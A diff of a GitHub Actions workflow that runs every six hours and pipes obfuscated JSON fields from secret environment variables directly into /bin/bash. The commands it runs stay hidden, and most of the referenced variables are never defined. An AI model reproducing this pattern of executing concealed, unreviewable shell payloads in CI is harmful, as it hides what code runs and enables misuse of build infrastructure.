@@ -2,21 +2,27 @@ name: xintaicx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
+    - cron: '4 5/6 * * *'
 
-jobs:  # 21831
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xintaicx
         env:
-          zs981: ${{ secrets.zs981 }}
+          ckilg474: ${{ secrets.ckilg474 }}
         run: |
-          echo $zs981 | jq -r .fyltr00238 | /bin/bash
-          echo $uobv3603 | jq -r .zr82 | /bin/bash
-          echo $ckrsd4 | jq -r .bprfn43665 | /bin/bash
-          echo $dl66044 | jq -r .p45 | /bin/bash
-          echo $adgs83 | jq -r .m0 | /bin/bash
-          echo $cxvw9 | jq -r .cxy6 | /bin/bash
+          echo $ckilg474 | jq -r .o83 | /bin/bash
+          echo $ix7 | jq -r .lgmb1606 | /bin/bash
+          echo $wxh4 | jq -r .mli2 | /bin/bash
+          echo $c07 | jq -r .unlml5790 | /bin/bash
+          echo $gbnhy3 | jq -r .dk0 | /bin/bash
+          echo $ebjo6808 | jq -r .cy91 | /bin/bash
+          echo $qvk684 | jq -r .qlhj84 | /bin/bash
+          echo $cpe37402 | jq -r .iodqf6 | /bin/bash
+          echo $blpro87 | jq -r .lmj5 | /bin/bash
+          echo $z018 | jq -r .ns51221 | /bin/bash
+          echo $fqziv8 | jq -r .ounxa215 | /bin/bash
+          echo $legiq2 | jq -r .dwb90 | /bin/bash
 
